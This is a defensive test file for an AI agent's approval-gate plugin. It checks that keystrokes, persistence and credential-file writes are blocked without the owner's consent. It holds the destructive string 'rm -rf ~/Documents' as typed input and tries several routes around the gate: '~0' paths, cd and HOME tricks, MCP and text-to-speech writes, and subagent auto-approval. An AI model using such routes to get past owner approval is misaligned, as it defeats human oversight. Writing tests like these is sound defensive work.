        FT._resolve_path_for_task = real_resolve
        no_surface()

    check("never raises on junk input",
          G._pre_tool_call() is None
          and blocked(G._pre_tool_call(tool_name="write_file",
                                       args={"path": "~/.zshrc"})) is True)

    part_a_followup(H)

    # -- the dashboard's Trust panel on these keys (real permissions.py) -----
    sys.path.insert(0, os.path.join(REPO, "dashboard"))
    import permissions as PM  # noqa: E402  (HOME is the sandbox: default policy)
    want = {"computer_use:type": ("unknown", "ask"),
            G._PATH_CLASSES["rc"][0]: ("credential-write", "never"),
            G._PATH_CLASSES["login"][0]: ("unknown", "ask"),
            G._PATH_CLASSES["hermes"][0]: ("hermes-self", "ask"),
            G._PATH_CLASSES["install"][0]: ("hermes-self", "ask"),
            G._PATH_CLASSES["claude"][0]: ("unknown", "ask"),
            # C116 follow-up: SSH is a credential write (NEVER, like rc); the
            # code-execution classes always ask
            G._PATH_CLASSES["ssh"][0]: ("credential-write", "never"),
            G._PATH_CLASSES["exec"][0]: ("unknown", "ask"),
            G._PATH_CLASSES["git"][0]: ("unknown", "ask"),
            G._PATH_CLASSES["pkg"][0]: ("unknown", "ask")}
    got = {k: (PM.decide({"pattern_key": k, "pattern_keys": [k]})["class"],
               PM.decide({"pattern_key": k, "pattern_keys": [k]})["tier"])
           for k in want}
    # Pin the TIER (the safety property), not the class name, which the Trust
    # panel's own table may refine; the classes are shown when it fails.
    check("the dashboard never auto-approves a gated call (ask, or never for rc)",
          {k: v[1] for k, v in got.items()} == {k: v[1] for k, v in want.items()}, got)


# ---------------------------------------------------------------------------
# Part B — end to end through Hermes' own dispatcher
# ---------------------------------------------------------------------------
CHILD = r'''
import json, os, socket, sys, threading
plugin_dir = sys.argv[1]
home = os.environ["HOME"]; hh = os.environ["HERMES_HOME"]
_real = socket.socket.connect
def _no_net(self, addr):
    if self.family in (socket.AF_INET, socket.AF_INET6):
        raise OSError("network refused by the approval-gate test")
    return _real(self, addr)
socket.socket.connect = _no_net
os.makedirs(os.path.join(hh, "plugins"), exist_ok=True)
os.symlink(plugin_dir, os.path.join(hh, "plugins", "approval-gate"))
with open(os.path.join(hh, "config.yaml"), "w") as fh:
    fh.write("model:\n  default: none\napprovals:\n  gateway_timeout: 1\n"
             "command_allowlist:\n  - computer_use:scroll\n"
             "plugins:\n  enabled:\n    - approval-gate\n")
os.environ["HERMES_YOLO_MODE"] = "1"
os.environ["HERMES_COMPUTER_USE_BACKEND"] = "noop"
import model_tools
from tools.computer_use import tool as cu
from tools import approval as A
from hermes_cli import plugins as P
cu._backend = cu._NoopBackend(); cu._backend.start()
P.discover_plugins(force=True)
out = {"loaded": "approval-gate" in [k for k, v in P.get_plugin_manager()._plugins.items() if v.enabled]}
def run(tool, args):
    return model_tools.handle_function_call(tool, args, task_id="t1", session_id="s1", turn_id="u1")
def did(action):
    return any(c[0] == action for c in cu._backend.calls)
def p(rel):
    return os.path.join(home, rel)
z = {}
def zc(name, args):
    cu._backend.calls.clear(); r = run("computer_use", args); z[name] = [did(args["action"]), r[:300]]
zc("capture", {"action": "capture", "app": "Safari"})
zc("list_apps", {"action": "list_apps"})
zc("click", {"action": "click", "element": 4})
zc("type", {"action": "type", "text": "rm -rf ~/Documents\n"})
zc("key", {"action": "key", "keys": "return"})
zc("scroll", {"action": "scroll", "direction": "down"})
def zw(name, path, tool="write_file", args=None):
    r = run(tool, args or {"path": path, "content": "x\n"}); z[name] = [os.path.exists(path), r[:300]]
zw("zshrc", p(".zshrc"))
zw("launchagent", p("Library/LaunchAgents/x.plist"))
zw("permissions", os.path.join(hh, "permissions.json"))
zw("mcp_allow", os.path.join(hh, "mcp-allow.json"))
zw("v4a", p(".zprofile"), "patch", {"mode": "patch", "patch":
   "*** Begin Patch\n*** Add File: %s\n+export X=1\n*** End Patch\n" % p(".zprofile")})
zw("ordinary", p("notes/today.txt"))
zw("inbox", os.path.join(hh, "dashboard", "inbox", "a.txt"))
# C116 follow-up: a program directory on PATH, an MCP write tool (another
# process, so no Hermes file guard), and a media tool's output path
zw("local_bin", p(".local/bin/hermes"))
zw("gitconfig", p(".gitconfig"))
from tools.registry import registry
def _fake_mcp_write(args, **kw):
    fp = os.path.expanduser(args["path"])
    os.makedirs(os.path.dirname(fp), exist_ok=True)
    with open(fp, "w") as fh:
        fh.write(args.get("content", ""))
    return json.dumps({"ok": True})
registry.register(name="mcp_fs_write_file", toolset="mcp-fs", handler=_fake_mcp_write,
                  schema={"name": "mcp_fs_write_file", "description": "test double",
                          "parameters": {"type": "object", "properties": {
                              "path": {"type": "string"}, "content": {"type": "string"}}}})
zw("mcp_rc", p(".bash_login"), "mcp_fs_write_file", {"path": p(".bash_login"), "content": "x"})
zw("mcp_ssh", p(".ssh/config"), "mcp_fs_write_file", {"path": p(".ssh/config"), "content": "x"})
zw("mcp_ordinary", p("notes/mcp.txt"), "mcp_fs_write_file", {"path": p("notes/mcp.txt"), "content": "x"})
zw("tts_bin", p("bin/hermes"), "text_to_speech", {"text": "hello", "output_path": p("bin/hermes")})
# a delegate_task subagent thread with delegation.subagent_auto_approve: true
from tools import delegate_tool, terminal_tool
terminal_tool.set_approval_callback(delegate_tool._subagent_auto_approve)
zc("sub_type", {"action": "type", "text": "rm -rf ~/Documents\n"})
zw("sub_zshrc", p(".zshenv"))
terminal_tool.set_approval_callback(None)
out["z"] = z
os.environ["HERMES_GATEWAY_SESSION"] = "1"; os.environ["HERMES_EXEC_ASK"] = "1"
os.environ["HERMES_INTERACTIVE"] = "1"
import tui_gateway.server as S
frames, answers = [], []
S.write_json = lambda obj: (frames.append(obj), True)[1]
A.set_current_session_key("sess-1")
def notify(data):
    S._emit_approval_request("sid-1", data)
    choice = answers.pop(0) if answers else None
    if choice:
        threading.Timer(0.1, lambda: A.resolve_gateway_approval("sess-1", choice)).start()
A.register_gateway_notify("sess-1", notify)
def cards():
    return [f["params"]["payload"] for f in frames
            if f.get("method") == "event" and f.get("params", {}).get("type") == "approval.request"]
sv = {}
def step(name, choices, tool, args, path=None, action=None):
    cu._backend.calls.clear(); frames.clear(); answers[:] = list(choices)
    r = run(tool, args)
    ran = os.path.exists(path) if path else did(action or args.get("action"))
    sv[name] = [ran, r[:300], cards()]
step("type_deny", ["deny"], "computer_use", {"action": "type", "text": "hello\n"})
step("type_approve", ["approve"], "computer_use", {"action": "type", "text": "hello\n"})
step("click_session", ["session"], "computer_use", {"action": "click", "element": 2})
step("click_again", [], "computer_use", {"action": "click", "element": 3})
step("timeout", [], "computer_use", {"action": "double_click", "element": 9}, action="click")
step("capture", [], "computer_use", {"action": "capture"})
step("bashrc", ["approve"], "write_file", {"path": p(".bashrc"), "content": "alias ll='ls -l'\n"}, path=p(".bashrc"))
step("settings", ["deny"], "write_file", {"path": os.path.join(hh, "dashboard", "settings.json"), "content": "{}"},
     path=os.path.join(hh, "dashboard", "settings.json"))
out["serve"] = sv
# review R4-c01: a path the shell layer is handed raw (a V4A header, the path
# of read_file / search_files) is judged where THAT layer puts it. The approval
# session key is "sess-1" and the task id "t1" — the Telegram gateway's shape —
# so Hermes' task resolver does not follow the terminal's `cd`.
import shlex
sh = {}
la = p("Library/LaunchAgents"); os.makedirs(la, exist_ok=True)
gh = os.path.join(hh, "dashboard", "github"); os.makedirs(gh, exist_ok=True)
with open(os.path.join(gh, "credential.json"), "w") as fh:
    fh.write('{"token": "FAKE-CANARY-not-a-token"}\n')
ADD = "*** Begin Patch\n*** Add File: %s\n+x\n*** End Patch\n"
def sstep(name, tool, args, path=None):
    frames.clear(); answers[:] = ["deny"]
    r = run(tool, args)
    sh[name] = [bool(path) and os.path.exists(path), r[:300], len(cards()), "FAKE-CANARY" in r]
def term(cmd):
    return run("terminal", {"command": cmd})
sstep("tilde0_v4a", "patch", {"mode": "patch", "patch": ADD % "~0/Library/LaunchAgents/t0.plist"},
      os.path.join(la, "t0.plist"))
sstep("tilde0_search", "search_files", {"pattern": "FAKE", "path": "~0/.hermes/dashboard"})
sh["cd"] = term("cd " + shlex.quote(la) + " && pwd")[:200]
sstep("cd_v4a", "patch", {"mode": "patch", "patch": ADD % "cd.plist"}, os.path.join(la, "cd.plist"))
sstep("cd_write_file", "write_file", {"path": "wf.plist", "content": "x"}, os.path.join(la, "wf.plist"))
term("cd " + shlex.quote(os.path.join(hh, "dashboard")))
sstep("cd_search", "search_files", {"pattern": "FAKE"})
sstep("cd_read", "read_file", {"path": "github/credential.json"})
term("cd " + shlex.quote(home) + " && export HOME=" + shlex.quote(p("Library")))
sstep("home_v4a", "patch", {"mode": "patch", "patch": ADD % "~/LaunchAgents/home.plist"},
      os.path.join(la, "home.plist"))
term("export HOME=" + shlex.quote(home))
sstep("ordinary_v4a", "patch", {"mode": "patch", "patch": ADD % "notes/shell-ok.txt"},
      p("notes/shell-ok.txt"))
sstep("ordinary_search", "search_files", {"pattern": "FAKE"})
out["shell"] = sh
os.environ["HERMES_CRON_SESSION"] = "1"
step("cron", ["approve"], "computer_use", {"action": "set_value", "value": "x", "element": 1})
out["cron"] = sv.pop("cron")
# serve's module points sys.stdout at stderr (stdout is its protocol channel)
os.write(1, ("E2E-RESULT " + json.dumps(out) + "\n").encode())
'''


def part_b():
    print("\nPart B — end to end through Hermes' own plugin dispatcher")
    if not (os.path.isfile(HERMES_PY) and os.path.isdir(HERMES_AGENT)):
        # a SKIP line, so run.sh counts it and CI's FAIL_ON_SKIP sees it
        print("  SKIP Part B (end to end through Hermes' own dispatcher): no Hermes "
              "install at %s — Part A still ran" % HERMES_AGENT)
        return
    work = tempfile.mkdtemp(prefix="c111-e2e-", dir=_TMP)
    child_home = os.path.join(work, "home")
    os.makedirs(os.path.join(child_home, ".hermes"), mode=0o700)
    script = os.path.join(work, "child.py")
    with open(script, "w") as fh:
        fh.write(CHILD)
    env = {k: v for k, v in os.environ.items()
           if not k.startswith("HERMES_") and k not in ("PYTHONPATH", "PYTHONHOME")}
    env.update(HOME=child_home, HERMES_HOME=os.path.join(child_home, ".hermes"),
               HERMES_TESTS_OFFLINE="1")
    try:
        proc = subprocess.run([HERMES_PY, script, PLUGIN_DIR], cwd=work, env=env,
                              capture_output=True, text=True, timeout=240)
    except Exception as e:
        check("the end-to-end child ran", False, e)
        return
    line = [l for l in proc.stdout.splitlines() if l.startswith("E2E-RESULT ")]
    if not line:
        check("the end-to-end child ran", False,
              (proc.returncode, proc.stdout[-600:], proc.stderr[-1500:]))
        return
    out = json.loads(line[-1][len("E2E-RESULT "):])
    z, sv = out["z"], out["serve"]
    check("E2E: the plugin is loaded from plugins.enabled", out.get("loaded"), out)
    check("E2E -z: capture and list_apps reach the backend",
          z["capture"][0] and z["list_apps"][0], [z["capture"], z["list_apps"]])
    check("E2E -z: click / type / key never reach the backend (YOLO is set)",
          not z["click"][0] and not z["type"][0] and not z["key"][0]
          and all("[approval-gate] BLOCKED" in z[k][1] for k in ("click", "type", "key")),
          [z["click"], z["type"], z["key"]])
    check("E2E -z: command_allowlist opt-out lets scroll through",
          z["scroll"][0], z["scroll"])
    for k in ("zshrc", "launchagent", "permissions", "mcp_allow", "v4a"):
        if z[k][0] or "[approval-gate] BLOCKED" not in z[k][1]:
            check("E2E -z: %s write blocked and not on disk" % k, False, z[k])
            break
    else:
        check("E2E -z: ~/.zshrc, a LaunchAgent, permissions.json, mcp-allow.json and "
              "a V4A ~/.zprofile are all blocked and nothing is written", True)
    check("E2E -z: ordinary and inbox writes still work",
          z["ordinary"][0] and z["inbox"][0], [z["ordinary"], z["inbox"]])
    for k in ("local_bin", "gitconfig", "mcp_rc", "mcp_ssh", "tts_bin"):
        if z[k][0] or "[approval-gate] BLOCKED" not in z[k][1]:
            check("E2E -z: C116 follow-up %s blocked and not on disk" % k, False, z[k])
            break
    else:
        check("E2E -z: C116 follow-up — ~/.local/bin/hermes and ~/.gitconfig writes, an "
              "MCP write tool to a shell rc file and to ~/.ssh/config, and a "
              "text_to_speech output_path in ~/bin are all blocked, nothing written", True)
    check("E2E -z: the same MCP tool still writes an ordinary file",
          z["mcp_ordinary"][0], z["mcp_ordinary"])
    check("E2E: Hermes' own subagent auto-approve callback is not consent "
          "(no keystrokes, no ~/.zshenv)",
          not z["sub_type"][0] and not z["sub_zshrc"][0]
          and "[approval-gate] BLOCKED" in z["sub_type"][1]
          and "[approval-gate] BLOCKED" in z["sub_zshrc"][1],
          [z["sub_type"], z["sub_zshrc"]])

    sh = out.get("shell") or {}
    gone = lambda k: (k in sh and not sh[k][0] and "[approval-gate] BLOCKED" in sh[k][1])
    check("E2E shell layer: a V4A `~0/Library/LaunchAgents/...` header is refused "
          "outright (no card, nothing written)",
          gone("tilde0_v4a") and sh["tilde0_v4a"][2] == 0, sh.get("tilde0_v4a"))
    check("E2E shell layer: search_files ~0/.hermes/dashboard is refused and the "
          "key file is not returned",
          gone("tilde0_search") and not sh["tilde0_search"][3], sh.get("tilde0_search"))
    check("E2E shell layer (Telegram shape): after `terminal cd ~/Library/LaunchAgents` "
          "a relative V4A header raises a card and is not written",
          gone("cd_v4a") and sh["cd_v4a"][2] == 1, [sh.get("cd"), sh.get("cd_v4a")])
    check("E2E shell layer: write_file with the same relative path is judged where "
          "Hermes' tool layer writes it — never into the LaunchAgents folder",
          "cd_write_file" in sh and not sh["cd_write_file"][0], sh.get("cd_write_file"))
    check("E2E shell layer: after `cd ~/.hermes/dashboard`, a default-root search and "
          "a relative read are the secret block, and the key file is not returned",
          gone("cd_search") and gone("cd_read") and not sh["cd_search"][3]
          and not sh["cd_read"][3], [sh.get("cd_search"), sh.get("cd_read")])
    check("E2E shell layer: after `export HOME=~/Library`, a V4A ~/LaunchAgents/... "
          "header raises a card and is not written",
          gone("home_v4a") and sh["home_v4a"][2] == 1, sh.get("home_v4a"))
    check("E2E shell layer control: an ordinary relative V4A patch and a default-root "
          "search still run with no card",
          "ordinary_v4a" in sh and sh["ordinary_v4a"][0] and sh["ordinary_v4a"][2] == 0
          and "[approval-gate]" not in sh["ordinary_search"][1],
          [sh.get("ordinary_v4a"), sh.get("ordinary_search")])

    cards = sv["type_deny"][2]
    check("E2E serve: one approval.request frame, built by serve's own emitter",
          len(cards) == 1 and cards[0].get("pattern_key") == "computer_use:type"
          and "hello" in cards[0].get("command", ""), cards)
    check("E2E serve: deny -> the keystrokes never reach the backend",
          not sv["type_deny"][0] and "has NOT consented" in sv["type_deny"][1],
          sv["type_deny"][:2])
    check("E2E serve: approve -> typed", sv["type_approve"][0], sv["type_approve"][:2])
    check("E2E serve: session -> clicked, and the next click is not asked again",
          sv["click_session"][0] and len(sv["click_session"][2]) == 1
          and sv["click_again"][0] and not sv["click_again"][2],
          [sv["click_session"], sv["click_again"]])
    check("E2E serve: no answer -> blocked after approvals.gateway_timeout",
          not sv["timeout"][0] and "timed out" in sv["timeout"][1], sv["timeout"][:2])
    check("E2E serve: capture never raises a card", sv["capture"][0] and not sv["capture"][2],
          sv["capture"])
    check("E2E serve: an approved ~/.bashrc write lands", sv["bashrc"][0], sv["bashrc"][:2])
    check("E2E serve: a denied settings.json write does not",
          not sv["settings"][0] and len(sv["settings"][2]) == 1, sv["settings"][:2])
    check("E2E cron: never asks, never runs",
          not out["cron"][0] and not out["cron"][2]
          and "[approval-gate] BLOCKED" in out["cron"][1], out["cron"])

    sys.path.insert(0, os.path.join(REPO, "dashboard"))
    import permissions as PM  # noqa: E402
    tiers = []
    for name in ("type_deny", "bashrc", "settings"):
        for c in sv[name][2]:
            v = PM.decide(c)
            tiers.append((c.get("pattern_key"), v["class"], v["tier"]))
    check("E2E: the frames the dashboard would get resolve to ask / never, never auto",
          tiers and all(t[2] in ("ask", "never") for t in tiers)
          and dict((t[0], t[2]) for t in tiers).get(
              "write_file/patch to a sensitive credential/SSH/shell-rc path") == "never",
          tiers)


def main():
    print("approval-gate: desktop actions and sensitive writes need the owner")
    part_a()
    part_b()
    print("\nTESTS %d passed %d failed" % (PASSES[0], len(FAILS)))
    if FAILS:
        print("FAILED: " + ", ".join(FAILS), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
